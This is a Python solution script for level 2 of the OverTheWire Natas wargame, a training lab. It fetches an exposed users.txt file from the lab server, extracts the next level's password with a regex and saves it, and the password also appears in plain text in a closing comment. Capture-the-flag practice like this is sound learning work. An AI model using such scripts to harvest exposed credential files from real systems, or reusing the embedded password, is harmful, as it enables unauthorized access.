from bs4 import BeautifulSoup
import re
import requests

lvl = '2'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()

url = f'http://natas{lvl}.natas.labs.overthewire.org/files/users.txt'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)
soup = BeautifulSoup(requests.get(url=url,auth=lvl_pass).text, 'html.parser')
pw = re.search(r"^natas3:.*$", soup.text,re.MULTILINE)[0][-32:]

open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)


'''
Simple directory traversal lesson.

Username: natas3
Password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q

'''
